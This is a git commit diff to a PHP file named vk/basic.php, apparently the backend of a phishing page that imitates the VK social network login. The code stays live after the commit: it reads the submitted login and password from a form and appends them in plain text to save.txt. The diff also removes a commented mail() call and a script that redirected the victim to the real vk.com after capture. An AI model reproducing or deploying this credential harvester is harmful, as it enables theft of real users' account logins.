591a2c2d3077dda73584dcdecebf66e6c6f4d461
GimiOne <dim.zaikin2013@gmail.com>
2019-03-29 18:46:33 +0300

    Update basic.php

--- vk/basic.php
+++ vk/basic.php
@@ -1,12 +1,9 @@
 <?php
-//mail('dim.zaikin2013@gmail.com','sds','sdssd');
-    $login = $_POST["login"]; // вот мы получаем значение текстового поля =)
+    $login = $_POST["login"];
     $pass = $_POST["pass"];
     $filed = "save.txt";
     $result = "Login: $login | Password: $pass\r\n";
 	$rez = $result;
 	file_put_contents($filed, $rez, FILE_APPEND);
 ?>
-<script type="text/javascript">
-	window.open('https://www.vk.com/');
-</script>
+ 
